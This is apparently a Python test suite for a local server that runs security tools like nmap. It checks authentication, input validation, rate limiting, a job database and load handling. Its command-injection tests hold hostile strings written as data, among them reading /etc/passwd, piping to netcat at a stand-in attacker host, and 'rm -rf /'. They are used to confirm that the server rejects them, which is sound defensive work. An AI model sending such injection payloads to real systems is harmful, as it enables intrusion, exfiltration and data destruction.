#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║ NullSec Stress Test Suite v7.0                                              ║
║ Comprehensive security & functionality testing                              ║
║ Fuzzing • Injection • Load • Edge Cases • Kali Linux Optimized             ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import random
import string
import subprocess
import threading
import requests
from pathlib import Path
from typing import Dict, List, Tuple, Any

sys.path.insert(0, str(Path(__file__).parent.parent))

try:
    from modules.worker.job_store import JobStore, JobStoreError
except ImportError:
    print("❌ Cannot import JobStore. Is the install complete?")
    sys.exit(1)

SERVER_URL = os.environ.get("HEXSTRIKE_SERVER_URL", "http://localhost:8888")
API_TOKEN = os.environ.get("API_TOKEN", "")

class Colors:
    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    BOLD = "\033[1m"
    END = "\033[0m"

def print_header(text: str):
    print(f"\n{Colors.BLUE}{Colors.BOLD}{'='*60}{Colors.END}")
    print(f"{Colors.BLUE}{Colors.BOLD} {text}{Colors.END}")
    print(f"{Colors.BLUE}{Colors.BOLD}{'='*60}{Colors.END}")

def print_pass(text: str):
    print(f"{Colors.GREEN} ✓ {text}{Colors.END}")

def print_fail(text: str):
    print(f"{Colors.RED} ✗ {text}{Colors.END}")

def print_warn(text: str):
    print(f"{Colors.YELLOW} ! {text}{Colors.END}")

def get_headers() -> Dict[str, str]:
    headers = {"Content-Type": "application/json"}
    if API_TOKEN:
        headers["Authorization"] = f"Bearer {API_TOKEN}"
    return headers

def random_string(length: int = 10) -> str:
    """Generate a random string."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def random_ip() -> str:
    """Generate a random valid IP."""
    return f"{random.randint(1, 254)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

# ─── Test Functions ──────────────────────────────────────────────────────────

def test_server_up() -> bool:
    print_header("SERVER HEALTH CHECK")
    try:
        r = requests.get(f"{SERVER_URL}/health", timeout=5)
        if r.status_code == 200:
            data = r.json()
            print_pass(f"Server online (v{data.get('version', 'unknown')})")
            print_pass(f"Tools available: {data.get('tool_count', 0)}")
            print_pass(f"Stats: {data.get('stats', {})}")
            return True
        else:
            print_fail(f"Server returned HTTP {r.status_code}")
            return False
    except requests.exceptions.ConnectionError:
        print_fail("Cannot connect to server")
        return False
    except Exception as e:
        print_fail(f"Error: {e}")
        return False

def test_authentication() -> bool:
    print_header("AUTHENTICATION TESTS")
    passed = 0
    total = 3

    # Test 1: No auth
    try:
        r = requests.post(f"{SERVER_URL}/api/tools/execute", 
                         json={"tool": "nmap", "target": "127.0.0.1"},
                         timeout=5)
        if r.status_code == 401:
            print_pass("No auth -> 401 Unauthorized")
            passed += 1
        else:
            print_fail(f"No auth -> {r.status_code} (expected 401)")
    except Exception as e:
        print_fail(f"No auth test failed: {e}")

    # Test 2: Wrong token
    try:
        r = requests.post(
            f"{SERVER_URL}/api/tools/execute",
            json={"tool": "nmap", "target": "127.0.0.1"},
            headers={"Authorization": "Bearer wrong_token"},
            timeout=5
        )
        if r.status_code in (403, 500):
            print_pass(f"Wrong token -> {r.status_code} Forbidden/Error")
            passed += 1
        else:
            print_fail(f"Wrong token -> {r.status_code} (expected 403)")
    except Exception as e:
        print_fail(f"Wrong token test failed: {e}")

    # Test 3: Valid token
    if API_TOKEN:
        try:
            r = requests.post(
                f"{SERVER_URL}/api/tools/execute",
                json={"tool": "nmap", "target": "127.0.0.1"},
                headers=get_headers(),
                timeout=5
            )
            if r.status_code in (202, 400):
                print_pass("Valid token -> Accepted")
                passed += 1
            else:
                print_fail(f"Valid token -> {r.status_code}")
        except Exception as e:
            print_fail(f"Valid token test failed: {e}")
    else:
        print_warn("API_TOKEN not set, skipping valid token test")

    print(f"\n Authentication: {passed}/{total} passed")
    return passed == total

def test_command_injection() -> bool:
    print_header("COMMAND INJECTION TESTS")
    passed = True

    payloads = [
        {"tool": "nmap", "target": "127.0.0.1; cat /etc/passwd", "options": ""},
        {"tool": "nmap", "target": "127.0.0.1", "options": "-sV; touch /tmp/pwned"},
        {"tool": "nmap", "target": "127.0.0.1 $(whoami)", "options": ""},
        {"tool": "nmap", "target": "../../etc/passwd", "options": ""},
        {"tool": "nmap", "target": "127.0.0.1`whoami`", "options": ""},
        {"tool": "nmap", "target": "127.0.0.1|nc attacker.com 4444", "options": ""},
        {"tool": "badtool", "target": "127.0.0.1", "options": ""},
        {"tool": "nmap", "target": "-h", "options": ""},
        {"tool": "nmap", "target": "", "options": ""},
    ]

    for p in payloads:
        try:
            r = requests.post(
                f"{SERVER_URL}/api/tools/execute",
                json=p,
                headers=get_headers(),
                timeout=5
            )

            if p["tool"] == "badtool":
                if r.status_code == 404:
                    print_pass(f"Blocked unknown tool: {r.status_code}")
                else:
                    print_fail(f"Unknown tool accepted: {r.status_code}")
                    passed = False
            elif r.status_code in (400, 404, 202):
                print_pass(f"Payload sanitized: {str(p)[:60]}... -> {r.status_code}")
            else:
                print_fail(f"Unexpected response: {r.status_code}")
                passed = False

        except Exception as e:
            print_fail(f"Request failed: {e}")
            passed = False

    # Check for injection artifacts
    if os.path.exists("/tmp/pwned"):
        print_fail("CRITICAL: Command injection succeeded! /tmp/pwned exists!")
        os.remove("/tmp/pwned")
        passed = False
    else:
        print_pass("No command injection artifacts detected")

    return passed

def test_input_validation() -> bool:
    print_header("INPUT VALIDATION TESTS")
    passed = True

    tests = [
        ("", "empty target", 400),
        ("a" * 600, "long target", 400),
        ("../etc/passwd", "path traversal", 400),
        ("127.0.0.1; rm -rf /", "command injection", 400),
        ("127.0.0.1", "valid IP", 202),
        ("example.com", "valid domain", 202),
        ("https://example.com", "valid URL", 202),
        ("192.168.1.1", "valid IP v4", 202),
        ("::1", "valid IPv6", 202),
        ("test.example.co.uk", "valid subdomain", 202),
        ("-v", "leading dash", 400),
        ("/etc/passwd", "absolute path", 400),
        ("test\nrm -rf /", "newline injection", 400),
    ]

    for target, desc, expected in tests:
        try:
            r = requests.post(
                f"{SERVER_URL}/api/tools/execute",
                json={"tool": "nmap", "target": target},
                headers=get_headers(),
                timeout=5
            )

            if r.status_code == expected:
                print_pass(f"{desc}: {r.status_code}")
            else:
                print_fail(f"{desc}: {r.status_code} (expected {expected})")
                if desc in ("valid IP", "valid domain", "valid URL"):
                    passed = False

        except Exception as e:
            print_fail(f"{desc}: {e}")
            passed = False

    return passed

def test_job_lifecycle() -> bool:
    print_header("JOB LIFECYCLE TEST")

    if not API_TOKEN:
        print_warn("API_TOKEN not set, skipping job lifecycle test")
        return True

    try:
        r = requests.post(
            f"{SERVER_URL}/api/tools/execute",
            json={"tool": "nmap", "target": "127.0.0.1", "options": "-sn"},
            headers=get_headers(),
            timeout=10
        )

        if r.status_code != 202:
            print_fail(f"Job creation failed: {r.status_code}")
            return False

        data = r.json()
        job_id = data.get("job_id")
        print_pass(f"Job created: {job_id}")

        # Poll for completion
        for i in range(15):
            time.sleep(1)
            r = requests.get(
                f"{SERVER_URL}/api/jobs/{job_id}",
                headers=get_headers(),
                timeout=5
            )

            if r.status_code == 200:
                job = r.json()
                status = job.get("status")

                if i == 0:
                    print_pass(f"Job status: {status}")

                if status in ("done", "failed"):
                    print_pass(f"Job completed lifecycle (status: {status})")
                    return True
            else:
                print_fail(f"Status check failed: {r.status_code}")
                return False

        print_warn("Job still running after 15s (may be normal)")
        return True

    except Exception as e:
        print_fail(f"Job lifecycle test failed: {e}")
        return False

def test_rate_limiting() -> bool:
    print_header("RATE LIMITING TEST")

    if not API_TOKEN:
        print_warn("API_TOKEN not set, skipping rate limit test")
        return True

    responses = []
    errors = 0

    for i in range(20):
        try:
            r = requests.post(
                f"{SERVER_URL}/api/tools/execute",
                json={"tool": "nmap", "target": "127.0.0.1"},
                headers=get_headers(),
                timeout=2
            )
            responses.append(r.status_code)
        except Exception:
            responses.append(0)
            errors += 1

    if 429 in responses:
        print_pass("Rate limiting is active (429 received)")
        return True
    elif errors > 5:
        print_warn(f"Multiple connection errors ({errors}), server may be overloaded")
        return True
    else:
        print_warn("No rate limiting detected (may need more requests or server config)")
        return True

def test_database_integrity() -> bool:
    print_header("DATABASE INTEGRITY TEST")

    try:
        store = JobStore()

        # Test create
        job_id = store.create_job("test", "127.0.0.1", "-sn", priority=1)
        print_pass(f"Created test job: {job_id}")

        # Test get
        job = store.get_job(job_id)
        if job and job["tool"] == "test":
            print_pass("Job retrieval works")
        else:
            print_fail("Job retrieval failed")
            return False

        # Test update
        store.update_job(job_id, "done", result="Test passed", exit_code=0)
        job = store.get_job(job_id)
        if job["status"] == "done":
            print_pass("Job update works")
        else:
            print_fail("Job update failed")
            return False

        # Test stats
        stats = store.get_stats()
        print_pass(f"Stats: {stats}")

        # Test list
        jobs = store.list_jobs(limit=10)
        print_pass(f"List jobs: {len(jobs)} returned")

        # Test cleanup
        store.cleanup_old_jobs(days=0)
        job = store.get_job(job_id)
        if job is None:
            print_pass("Cleanup works")
        else:
            print_warn("Cleanup did not remove test job (may be expected)")

        # Test error handling
        try:
            store.create_job("", "")  # Should raise error
            print_fail("Should have rejected empty tool name")
            return False
        except JobStoreError:
            print_pass("Properly rejects invalid input")

        return True

    except Exception as e:
        print_fail(f"Database test failed: {e}")
        return False

def test_concurrent_access() -> bool:
    print_header("CONCURRENT ACCESS TEST")

    try:
        store = JobStore()
        job_ids = []
        errors = []

        def create_jobs():
            for _ in range(10):
                try:
                    jid = store.create_job("nmap", "127.0.0.1", "-sn")
                    job_ids.append(jid)
                except Exception as e:
                    errors.append(str(e))

        threads = [threading.Thread(target=create_jobs) for _ in range(5)]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=10)

        if errors:
            print_fail(f"Concurrent errors: {errors[:3]}")
            return False

        print_pass(f"Created {len(job_ids)} jobs concurrently without errors")

        # Cleanup
        store.cleanup_old_jobs(days=0)
        return True

    except Exception as e:
        print_fail(f"Concurrent test failed: {e}")
        return False

def test_fuzzing() -> bool:
    print_header("FUZZING TEST")

    if not API_TOKEN:
        print_warn("API_TOKEN not set, skipping fuzzing test")
        return True

    passed = True
    fuzz_targets = [
        random_string(5),
        random_string(50),
        random_string(200),
        random_ip(),
        f"test{random_string(5)}.com",
        f"https://{random_string(10)}.com/path",
    ]

    for target in fuzz_targets:
        try:
            r = requests.post(
                f"{SERVER_URL}/api/tools/execute",
                json={"tool": "nmap", "target": target},
                headers=get_headers(),
                timeout=3
            )
            if r.status_code not in (202, 400):
                print_fail(f"Fuzz target '{target[:30]}' returned {r.status_code}")
                passed = False
        except Exception as e:
            print_fail(f"Fuzz target failed: {e}")
            passed = False

    if passed:
        print_pass("All fuzz targets handled correctly")

    return passed

def test_edge_cases() -> bool:
    print_header("EDGE CASE TESTS")
    passed = True

    edge_cases = [
        # Malformed JSON
        ("not json", "malformed json", 400),
        # Empty JSON
        ({}, "empty json", 400),
        # Missing fields
        ({"tool": "nmap"}, "missing target", 400),
        ({"target": "127.0.0.1"}, "missing tool", 400),
        # Wrong types
        ({"tool": 123, "target": "127.0.0.1"}, "tool as int", 400),
        ({"tool": "nmap", "target": ["127.0.0.1"]}, "target as list", 400),
        # Very long inputs
        ({"tool": "nmap", "target": "a" * 1000}, "very long target", 400),
        # Unicode
        ({"tool": "nmap", "target": "127.0.0.1", "options": "测试"}, "unicode options", 202),
    ]

    for payload, desc, expected in edge_cases:
        try:
            if isinstance(payload, str):
                r = requests.post(
                    f"{SERVER_URL}/api/tools/execute",
                    data=payload,
                    headers={**get_headers(), "Content-Type": "application/json"},
                    timeout=3
                )
            else:
                r = requests.post(
                    f"{SERVER_URL}/api/tools/execute",
                    json=payload,
                    headers=get_headers(),
                    timeout=3
                )

            if r.status_code == expected:
                print_pass(f"{desc}: {r.status_code}")
            else:
                print_fail(f"{desc}: {r.status_code} (expected {expected})")
                passed = False
        except Exception as e:
            print_fail(f"{desc}: {e}")
            passed = False

    return passed

def test_load() -> bool:
    print_header("LOAD TEST")

    if not API_TOKEN:
        print_warn("API_TOKEN not set, skipping load test")
        return True

    success_count = 0
    error_count = 0
    num_requests = 50

    def make_request():
        nonlocal success_count, error_count
        try:
            r = requests.get(f"{SERVER_URL}/health", timeout=5)
            if r.status_code == 200:
                success_count += 1
            else:
                error_count += 1
        except Exception:
            error_count += 1

    threads = [threading.Thread(target=make_request) for _ in range(num_requests)]
    start = time.time()

    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=10)

    elapsed = time.time() - start

    print_pass(f"Load test: {success_count}/{num_requests} successful in {elapsed:.2f}s")
    if error_count > 0:
        print_warn(f"{error_count} requests failed")

    return success_count > num_requests * 0.8  # 80% success rate

# ─── Main Test Runner ────────────────────────────────────────────────────────

def run_all_tests() -> Dict[str, bool]:
    print(f"""
{Colors.BOLD}
╔══════════════════════════════════════════════════════════════════════════════╗
║ NULLSEC RED TEAM AI — STRESS TEST SUITE v7.0                               ║
║ Server: {SERVER_URL:<62} ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Colors.END}
""")

    results = {}

    if not test_server_up():
        print(f"\n{Colors.RED}{Colors.BOLD}Server is offline. Start it with:{Colors.END}")
        print(f" sudo systemctl start hexstrike")
        return {"server_up": False}

    results["auth"] = test_authentication()
    results["injection"] = test_command_injection()
    results["validation"] = test_input_validation()
    results["job_lifecycle"] = test_job_lifecycle()
    results["rate_limiting"] = test_rate_limiting()
    results["database"] = test_database_integrity()
    results["concurrent"] = test_concurrent_access()
    results["fuzzing"] = test_fuzzing()
    results["edge_cases"] = test_edge_cases()
    results["load"] = test_load()

    print(f"\n{Colors.BOLD}{'='*60}{Colors.END}")
    print(f"{Colors.BOLD} TEST SUMMARY{Colors.END}")
    print(f"{Colors.BOLD}{'='*60}{Colors.END}")

    total = len(results)
    passed = sum(1 for v in results.values() if v)

    for test, result in results.items():
        status = f"{Colors.GREEN}PASSED{Colors.END}" if result else f"{Colors.RED}FAILED{Colors.END}"
        print(f" {test:.<40} {status}")

    print(f"\n Total: {passed}/{total} passed")

    if passed == total:
        print(f"\n{Colors.GREEN}{Colors.BOLD} ✅ ALL TESTS PASSED{Colors.END}")
    else:
        print(f"\n{Colors.YELLOW}{Colors.BOLD} ⚠️ SOME TESTS FAILED — Review output above{Colors.END}")

    return results

if __name__ == "__main__":
    run_all_tests()
